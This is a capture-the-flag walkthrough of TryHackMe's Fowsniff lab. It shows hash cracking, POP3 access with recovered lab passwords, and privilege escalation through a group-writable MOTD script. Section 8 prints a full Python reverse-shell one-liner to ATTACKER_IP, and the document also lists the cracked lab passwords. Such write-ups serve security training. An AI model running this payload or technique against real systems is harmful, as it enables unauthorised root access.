# Fowsniff — TryHackMe Write‑Up (Pentest Walkthrough)

> Educational write‑up describing the attack chain used during the Fowsniff CTF machine on TryHackMe.

---

## 🧭 Overview

Target: Fowsniff Corp (TryHackMe)

Goal:

* Gain initial access
* Enumerate services
* Obtain credentials
* Achieve SSH access
* Perform privilege escalation
* Obtain ROOT access

---

# 1. Reconnaissance & Enumeration

Initial Nmap scan:

```
nmap -sC -sV TARGET_IP
```

Open services discovered:

* 22 — SSH
* 80 — HTTP (Apache Web Server)
* 110 — POP3
* 143 — IMAP

The presence of POP3 and IMAP strongly suggested email‑based exploitation.

---

# 2. Website Enumeration

The HTTP website showed a defaced page claiming the company had been hacked by **B1gN1nj4**.

Further OSINT research revealed a password leak containing email users and MD5 password hashes.

Example format:

```
username@fowsniff : md5hash
```

---

# 3. Password Cracking

Hashes were cracked using John the Ripper / Hashcat.

Example:

```
hashcat -m 0 hashes.txt rockyou.txt
```

Recovered passwords included:

* mailcall
* bilbo101
* apples01
* skyler22
* scoobydoo2
* carp4ever
* orlando12
* 07011972

---

# 4. POP3 Access

Manual connection performed using Netcat:

```
nc TARGET_IP 110
```

Login:

```
USER seina
PASS scoobydoo2
```

POP3 Commands used:

```
LIST
RETR 1
```

Emails contained critical information.

---

# 5. SSH Credential Discovery

An internal email revealed a temporary SSH password:

```
S1ck3nBluff+secureshell
```

This password allowed SSH authentication.

SSH access gained:

```
ssh baksteen@TARGET_IP
```

---

# 6. Local Enumeration

After SSH access:

```
id
ls -la
sudo -l
```

User belonged to the **users** group.

A writable script was discovered:

```
/opt/cube/cube.sh
```

Permissions:

```
-rw-rwxr-- parede users cube.sh
```

The group had write permissions.

---

# 7. Privilege Escalation Discovery

The script printed the login banner.

Observation:

The banner appeared every time a user connected via SSH.

This indicated the script was executed through MOTD.

Location:

```
/etc/update-motd.d/
```

Scripts inside this directory execute as ROOT during SSH login.

---

# 8. Reverse Shell Injection

A Python reverse shell was appended to cube.sh:

```
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

Listener started:

```
nc -lvnp 1234
```

---

# 9. Root Access

After reconnecting via SSH:

```
ssh baksteen@TARGET_IP
```

The MOTD executed cube.sh as root.

Reverse shell connected back to Kali.

Verification:

```
whoami
```

Output:

```
root
```

ROOT access achieved.

---

# 10. Lessons Learned

Key concepts demonstrated:

* Service enumeration
* Credential reuse
* Password cracking
* POP3 interaction
* SSH pivoting
* Group writable scripts
* MOTD privilege escalation
